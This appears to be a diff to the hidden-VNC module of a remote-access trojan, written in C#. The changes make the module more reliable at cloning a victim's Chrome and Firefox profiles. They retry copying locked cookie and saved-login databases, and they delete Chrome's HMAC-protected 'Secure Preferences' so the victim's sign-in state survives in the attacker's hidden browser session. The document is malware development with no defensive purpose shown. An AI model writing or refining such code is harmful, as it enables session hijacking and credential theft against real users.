@@ -1733,10 +1733,14 @@ internal static class HvncFeature
         reporter.Start();
         Parallel.ForEach(pairs, _cloneParallel, pair =>
         {
-            try { File.Copy(pair.Src, pair.Dst, overwrite: true); }
-            catch (IOException) { }
-            catch (UnauthorizedAccessException) { }
-            catch { }
+            // Retry locked files (SQLite Cookies/Login Data stay locked briefly after process exit).
+            for (int attempt = 0; attempt < 4; attempt++)
+            {
+                try { File.Copy(pair.Src, pair.Dst, overwrite: true); break; }
+                catch (IOException) { if (attempt < 3) Thread.Sleep(250); else break; }
+                catch (UnauthorizedAccessException) { break; }
+                catch { break; }
+            }
             Interlocked.Increment(ref progress[0]);
         });
         cts.Cancel();
@@ -2094,7 +2098,12 @@ internal static class HvncFeature
                 {
                     KillAndWaitForExit(exeBase, 3000);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
+                    Thread.Sleep(200); // let OS finish releasing the directory before clone starts
                     CloneProfileWithProgress(realProfile, hvncProfile, $"Cloning {hvncDirName}...");
+                    // Secure Preferences is HMAC-protected; cloning to a different path breaks the HMAC
+                    // → Chrome resets sign-in state. Delete it so Chrome regenerates a clean one.
+                    foreach (var sub in new[] { "Default", "Profile 1", "Profile 2", "Profile 3", "Guest Profile" })
+                        try { File.Delete(Path.Combine(hvncProfile, sub, "Secure Preferences")); } catch { }
                     StubLog.Info($"[HVNC] Profile cloned '{realProfile}' → '{hvncProfile}'");
                 }
                 else
@@ -2164,6 +2173,7 @@ internal static class HvncFeature
                 {
                     KillAndWaitForExit("firefox.exe", 3000);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, true); } catch { }
+                    Thread.Sleep(200); // let OS finish releasing the directory before clone starts
                     CloneProfileWithProgress(realProfile, hvncProfile, "Cloning firefox...");
                     StubLog.Info($"[HVNC] Firefox profile cloned '{realProfile}' → '{hvncProfile}'");
                 }
